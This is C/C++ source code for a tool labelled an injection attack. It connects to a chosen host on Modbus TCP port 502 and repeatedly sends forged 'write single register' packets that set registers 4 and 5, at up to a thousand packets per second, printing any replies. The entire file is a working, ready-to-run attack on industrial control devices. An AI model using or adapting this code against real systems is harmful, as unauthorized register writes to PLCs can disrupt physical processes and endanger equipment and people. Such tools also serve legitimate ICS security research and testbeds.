#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#include <iostream>
#include <fstream>
#include <string>

int frequency = 1000;
char host[100];

//-----------------------------------------------------------------------------
// Helper function - Makes the running thread sleep for the ammount of time
// in milliseconds
//-----------------------------------------------------------------------------
void sleep_us(int microseconds)
{
	struct timespec ts;
	ts.tv_sec = microseconds / 1000000;
	ts.tv_nsec = (microseconds % 1000000) * 1000;
	nanosleep(&ts, NULL);
}

void *receive_packets(void *arguments)
{
	while(1)
	{
		char buffer[10000];	
		int socket_fd = *(int *)arguments;
		int rcv_size = read(socket_fd, buffer, 10000);
		
		if (rcv_size > 0)
        {
            printf("Rcv: ");
            for (int i = 0; i < rcv_size; i++)
            {
                printf("%02x ", buffer[i]);
            }
            printf("\n");
        }
	}
}

void print_usage()
{
    printf("Usage: ./injection_attack -h [host] -f [frequency]\n");
	printf("If the -f argument is not provided, the attack will\n ");
	printf("run with a frequency of 1000 packets per sec.\n");
	printf("The -h argument is required for the attack to run.");
}

int main(int argc, char **argv)
{   
    int opt;
	opterr = 0;

	//======================================================
	//                 READ COMMAND LINE ARGS
	//======================================================

	while ((opt = getopt (argc, argv, "h:f:")) != -1)
	{
		switch (opt)
		{
			case 'h':
				strncpy(host, optarg, 100);
				break;
			case 'f':
				frequency = atoi(optarg);
				break;
			case '?':
				if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				print_usage();
				exit(1);
				break;
			default:
				abort();
		}
	}
    
	if (argc < 2)
    {
        print_usage();
        exit(1);
    }
    
    printf("Starting Injection Attack...\r\n");
    
	int sleep_time = 1000000/frequency;
	
	int socket_fd, port = 502;
	struct sockaddr_in server_addr;
	struct hostent *server;
	int data_len;
	socklen_t cli_len;
	char *hostaddr;
    //Modbus TCP packet {  TransID |   ProtID  |   MsgLen  | UID |  FC |        Data           }  
	char packet1[] =    {0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, 0x04, 0x00, 0x01};
    char packet2[] =    {0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, 0x05, 0x00, 0x01};
	//char localBuffer1[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x2b, 0x0e, 0x02, 0x00};
	
	while(1) 
	{
		//Create TCP Socket
		socket_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (socket_fd<0)
		{
			perror("Server: error creating stream socket");
			exit(1);
		}

		//Initialize Server Structures
		server = gethostbyname(host);
		if (server == NULL)
		{
			printf("Error locating host %s\n", host);
			return 0;
		}

		bzero((char *) &server_addr, sizeof(server_addr));
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(port);
		bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);

		//set timeout of 100ms on receive
		struct timeval tv;
		tv.tv_sec = 0;
		tv.tv_usec = 100000;
		if (setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
		{
			printf("Error setting timeout\n");
		}
	
		while (connect(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
		{
			perror("error connecting to server");
			//return 0;
		}
		
		pthread_t rcv_thread;
		int ret = -1;
		int arguments[1];
		arguments[0] = socket_fd;
		ret = pthread_create(&rcv_thread, NULL, receive_packets, arguments);
		if (ret == 0)
		{
			pthread_detach(rcv_thread);
		}

		while(1)
        {
            /******** SEND PACKET 1 ********/
            data_len = sendto(socket_fd, packet1, sizeof(packet1), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
            if (data_len < 0)
            {
                printf("Error sending data on socket %d\n", socket_fd);
                perror("error: ");
            }
            
            else if (data_len > 0)
            {
                printf("Sent: ");
                for (int i = 0; i < data_len; i++)
                {
                    printf("%02x ", packet1[i]);
                }
                printf("\n");
            }
            
            sleep_us(sleep_time);
            
            /******** SEND PACKET 2 ********/
            data_len = sendto(socket_fd, packet2, sizeof(packet2), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
            if (data_len < 0)
            {
                printf("Error sending data on socket %d\n", socket_fd);
                perror("error: ");
            }
            
            else if (data_len > 0)
            {
                printf("Sent: ");
                for (int i = 0; i < data_len; i++)
                {
                    printf("%02x ", packet2[i]);
                }
                printf("\n");
            }
            
            sleep_us(sleep_time);
		}
		
		pthread_cancel(rcv_thread);

		close(socket_fd);
	}
}